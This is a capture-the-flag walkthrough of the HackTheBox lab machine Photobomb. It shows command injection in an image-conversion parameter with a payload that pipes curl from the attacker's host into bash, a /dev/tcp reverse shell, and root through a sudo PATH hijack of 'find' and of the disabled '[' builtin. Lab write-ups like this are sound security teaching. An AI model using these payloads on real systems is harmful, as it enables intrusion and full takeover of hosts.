---
title: HTB: Photobomb
url: https://0xdf.gitlab.io/2023/02/11/htb-photobomb.html
date: 2023-02-11T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-photobomb, ctf, hackthebox, bash, bash-test, nmap, feroxbuster, image-magick, command-injection, injection, burp, burp-repeater, path-hijack, bash-builtins, sudo-setenv
---

![Photobomb](https://0xdfimages.gitlab.io/img/photobomb-cover.png)

Photobomb was on the easy end of HackTheBox weekly machines. I’ll find credentials in a JavaScript file, and use those to get access to an image manipulation panel. There’s a command injection vulnerability in the panel, which I’ll use to get execution and a shell. For privesc, the user can run a script as root, and there are two ways to get execution from this. The first is a find command that is called without the full path. The second is abusing the disabled Bash builtin [.

## Box Info

| Name | [Photobomb](https://hackthebox.com/machines/photobomb)  [Photobomb](https://hackthebox.com/machines/photobomb) [Play on HackTheBox](https://hackthebox.com/machines/photobomb) |
| --- | --- |
| Release Date | [08 Oct 2022](https://twitter.com/hackthebox_eu/status/1578022333574701059) |
| Retire Date | 11 Feb 2023 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Photobomb |
| Radar Graph | Radar chart for Photobomb |
| First Blood User | 00:04:55[Sm1l3z Sm1l3z](https://app.hackthebox.com/users/357237) |
| First Blood Root | 00:09:06[onurshin onurshin](https://app.hackthebox.com/users/247178) |
| Creator | [slartibartfast slartibartfast](https://app.hackthebox.com/users/85231) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.182
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-04 20:04 UTC
Nmap scan report for 10.10.11.182
Host is up (0.088s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.182
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-04 20:05 UTC
Nmap scan report for 10.10.11.182
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.86 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions, the host is likely running Ubuntu 20.04 focal. The web host redirects to `photobomb.htb`.

### Subdomain Fuzz

Because DNS names are involved here, I’ll us ffuf to fuzz for additional subdomains that may respond differently than the default case. I’ll start with no filter, and see that the default response is an HTTP 302 of size 154:

```

oxdf@hacky$ ffuf -u http://10.10.11.182 -H "Host: FUZZ.photobomb.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.182
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.photobomb.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

ns4                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 90ms]
www                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 89ms]
blog                    [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 89ms]             
mail                    [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 91ms]                     
new                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 89ms]
imap                    [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 89ms]                     
...[snip]...

```

I’ll ctrl-c to kill `fuff` and restart the same command with `--fs 154`. It doesn’t find anything. I’ll add `photobomb.htb` to my `/etc/hosts` file.

### Website - TCP 80

#### Site

The site is for some kind of photo printing pyramid scheme:

![image-20230204151116774](https://0xdfimages.gitlab.io/img/image-20230204151116774.png)

Clicking on “click here!” goes to `/printer`, but pops a request for HTTP basic auth:

![image-20230204151150993](https://0xdfimages.gitlab.io/img/image-20230204151150993.png)

It does say the creds are in the welcome pack, which I don’t have yet.

#### Tech Stack

The HTTP headers don’t give much additional information:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 04 Feb 2023 20:10:36 GMT
Content-Type: text/html;charset=utf-8
Connection: close
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 843

```

I am not able to guess the index extension. `index.php` and `index.html` both return 404, with a custom 404 page:

![image-20230204151418420](https://0xdfimages.gitlab.io/img/image-20230204151418420.png)

Interestingly, the link on the 404 page points to `localhost:1234`. Updating it to `photobomb.htb` does fix the image:

![image-20230204151531775](https://0xdfimages.gitlab.io/img/image-20230204151531775.png)

Peaking a the HTML source for the main page, there’s a `photobomb.js` script loaded:

![image-20230204151835714](https://0xdfimages.gitlab.io/img/image-20230204151835714.png)

Looking at it, there’s a function `init` set to run once the window loads:

```

function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;

```

It’s setting the link to include the password, user pH0t0, password b0Mb!.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it only identifies printer pages that I return 401 unauthorized:

```

oxdf@hacky$ feroxbuster -u http://photobomb.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://photobomb.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       22l       95w      843c http://photobomb.htb/
401      GET        7l       12w      188c http://photobomb.htb/printer
401      GET        7l       12w      188c http://photobomb.htb/printers
401      GET        7l       12w      188c http://photobomb.htb/printer_friendly
401      GET        7l       12w      188c http://photobomb.htb/printerfriendly
401      GET        7l       12w      188c http://photobomb.htb/printer-friendly
[####################] - 2m     60000/60000   0s      found:6       errors:0      
[####################] - 2m     30000/30000   244/s   http://photobomb.htb 
[####################] - 2m     30000/30000   245/s   http://photobomb.htb/ 

```

It could be that those different links all exist, but it seems more likely that the NGINX rule is looking for anything starting with `/printer` and checking auth. I can test this by visiting `/printer0xdf` and seeing that it asks for auth:

![image-20230204152043334](https://0xdfimages.gitlab.io/img/image-20230204152043334.png)

Since I do have the creds, I can try visiting one of these and entering them. They work, but lead to the 404 page.

## Shell as www-data

### Authenticated /printer

With the creds from above, `/printer` will load:

[![image-20230204152622036](https://0xdfimages.gitlab.io/img/image-20230204152622036.png)](https://0xdfimages.gitlab.io/img/image-20230204152622036.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20230204152622036.png)

There’s a bunch of images, and at the bottom, an option to download an image of a selected size:

![image-20230204152646220](https://0xdfimages.gitlab.io/img/image-20230204152646220.png)

Picking an image and pushing the button submits a POST to `/printer` with the following body:

```

photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=png&dimensions=1000x1500

```

### Command Injection

#### Strategy

It seems very likely that the server is not keeping different sizes and formats of each image on the server, but rather converting one image using a tool like `convert` (from [ImageMagick](https://imagemagick.org/index.php)) at the time of the request.

For example, to resize a JPG image to 1000 by 1000 and convert it to a PNG, the server could run:

```

convert original.jpg -resize 1000x1000 new.png

```

If that’s what the server is doing, then the following is user input (shown in `[]`):

```

convert [photo] -resize [dimensions] new.[filetype]

```

If any of these aren’t sanitized properly, there could be command injection.

#### POC

As I don’t see the output of the command run on the server, it seems unlikely that I’d be able to see the output of the command injection either. I’ll use a simple `sleep 5` payload to see if the server hangs.

Adding a command injection to the `photo` parameter returns immediately with a 500 Internal Server Error:

![image-20230204154242222](https://0xdfimages.gitlab.io/img/image-20230204154242222.png)

Same thing on `dimensions`:

![image-20230204154157976](https://0xdfimages.gitlab.io/img/image-20230204154157976.png)

However, on `filetype`, it takes over 6 seconds before returning 500:

![image-20230204154118135](https://0xdfimages.gitlab.io/img/image-20230204154118135.png)

#### Shell

To convert this into a shell, I’ll have it run `curl` to my webserver and get a `bash` script that will run a reverse shell:

```

filetype=png;curl+10.10.14.6/shell.sh|bash

```

I’ll host a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) as `shell.sh`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

I’ll run a Python webserver to host it.

When I send that request (using Burp Repeater), there’s a connection at my webserver:

```
10.10.11.182 - - [04/Feb/2023 20:44:39] "GET /shell.sh HTTP/1.1" 200 -

```

And then a connection at my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.182 42718
bash: cannot set terminal process group (735): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ 

```

I’ll do a [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q) with the `script` / `stty` trick:

```

wizard@photobomb:~/photobomb$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
wizard@photobomb:~/photobomb$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
wizard@photobomb:~/photobomb$

```

And grab `user.txt`:

```

wizard@photobomb:~$ cat user.txt
c3afcfa5************************

```

## Shell as root

### Enumeration

#### sudo

The first thing I’ll check for privileges escalation on Linux is `sudo -l` to list commands that the current user can run as another user:

```

wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh  

```

A few takeaways here:
- wizard can run `/opt/cleanup.sh` as root.
- `SETENV` means that the current environment will be used rather than a fresh one.

#### /opt/cleanup.sh

The `cleanup.sh` script looks to be managing log files for the web application:

```

#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \; 

```

At the top, the first time is sourcing the local `.bashrc` file. This would be used to set the environment as desired. Then it changes into the `photobomb` directory.

`[ -s log/photobomb.log ]` checks if that log file exists and has size greater than 0, and `! [ -L logs/photobomb.log ]` makes sure it’s not a symbolic link. If both are true, it moves the contents of the log file into `log/photobomb.log.old` and then calls `truncate` on the log to set it’s size to 0.

Finally, there’s a `find` command that will change all images in this directory and subdirectories to be owned by root.

#### .bashrc

Typically `.bashrc` files are found in home directories (and there’s one system-wide one in `/etc`), but there’s no reason there can’t be one here. I’ll run `cat .bashrc | grep -v "^#" | grep .` to get only the non-commented and non-blank lines. First, it adds `/snap/bin/` to the PATH:

```

PATH=${PATH/:\/snap\/bin/}

```

The next line is interesting:

```

enable -n [ # ]

```

It may be tempting to view this as the `#` between two square brackets, but it’s actually calling `enable -n [` and the rest is a comment. I’ll come back to this below.

There are some more commands in here, but nothing super interesting:

```

enable -n [ # ]
[ -z "$PS1" ] && return
shopt -s checkwinsize
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi
if ! [ -n "${SUDO_USER}" -a -n "${SUDO_PS1}" ]; then
  PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
if [ ! -e "$HOME/.sudo_as_admin_successful" ] && [ ! -e "$HOME/.hushlogin" ] ; then
    case " $(groups) " in *\ admin\ *|*\ sudo\ *)
    if [ -x /usr/bin/sudo ]; then
        cat <<-EOF
        To run a command as administrator (user "root"), use "sudo <command>".
        See "man sudo_root" for details.

        EOF
    fi
    esac
fi
if [ -x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-not-found ]; then
        function command_not_found_handle {
                # check because c-n-f could've been removed in the meantime
                if [ -x /usr/lib/command-not-found ]; then
                   /usr/lib/command-not-found -- "$1"
                   return $?
                elif [ -x /usr/share/command-not-found/command-not-found ]; then
                   /usr/share/command-not-found/command-not-found -- "$1"
                   return $?
                else
                   printf "%s: command not found\n" "$1" >&2
                   return 127
                fi
        }
fi

```

### Path Hijack

#### Easy Path

There’s a very simple path hijack in the script. I’ll notice that all the binaries called are referenced with full path except for that last `find`:

```

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

```

That means that `bash` will search the directories specified in the `$PATH` environment variable looking for a binary named `find`. Typically, it’ll find `find` in `/usr/bin/find`.

But that’s where the `SETENV` becomes useful to me.

I’ll create a script called `find` in a temp space like `/dev/shm` and set it as executable:

```

wizard@photobomb:/dev/shm$ echo -e '#!/bin/bash\n\nbash'        
#!/bin/bash

bash
wizard@photobomb:/dev/shm$ echo -e '#!/bin/bash\n\nbash' > find
wizard@photobomb:/dev/shm$ chmod +x find

```

Running this `find` just starts a new `bash` instance as the current user.

Now I’ll run `cleanup.sh` as root but with the `PATH` variable including the current directory at the front of the path:

```

wizard@photobomb:/dev/shm$ sudo PATH=$PWD:$PATH /opt/cleanup.sh 
root@photobomb:/home/wizard/photobomb#

```

It returns a root shell. And I can read `root.txt`:

```

root@photobomb:~# cat root.txt
bbfa4b76************************

```

#### Intended Path

I’m not sure where the `find` without the full path got added in, but the original submission required a bit more knowledge of Bash, and the builtin `[`. One of the mistakes I would also make when trying to use the syntax `[ -s /some/file ]` would be not including a space after the `[`. When you think of `[` in the same category as `{` or `(` in a programming language, then the space doesn’t make sense. But in Bash, `[` is actually the same as `test`, and a program on the filesystem ([this article](https://www.educative.io/courses/master-the-bash-shell/392YWp2pOv4) shows more detail).

This is clean on Photobomb:

```

wizard@photobomb:/dev/shm$ which [
/usr/bin/[
wizard@photobomb:/dev/shm$ file /usr/bin/[ 
/usr/bin/[: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=99cfd563b4850f124ca01f64a15ec24fd8277732, for GNU/Linux 3.2.0, stripped

```

In a typical shell, the binary isn’t called, as it’s a [Bash builtin](https://manpages.ubuntu.com/manpages/bionic/man7/bash-builtins.7.html). So even with no `$PATH`, it can still be called (like `echo`):

```

wizard@photobomb:/dev/shm$ export PATH=''
wizard@photobomb:/opt$ [ -s cleanup.sh ] && echo "exists"
exists

```

But, `enable -n [` disables it (see the [bash man page](https://linux.die.net/man/1/bash)). That means that I can do the same trick above, but with `[`:

```

wizard@photobomb:/dev/shm$ rm find
wizard@photobomb:/dev/shm$ echo -e '#!/bin/bash\n\nbash' > [
wizard@photobomb:/dev/shm$ chmod +x [
wizard@photobomb:/dev/shm$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/dev/shm#

```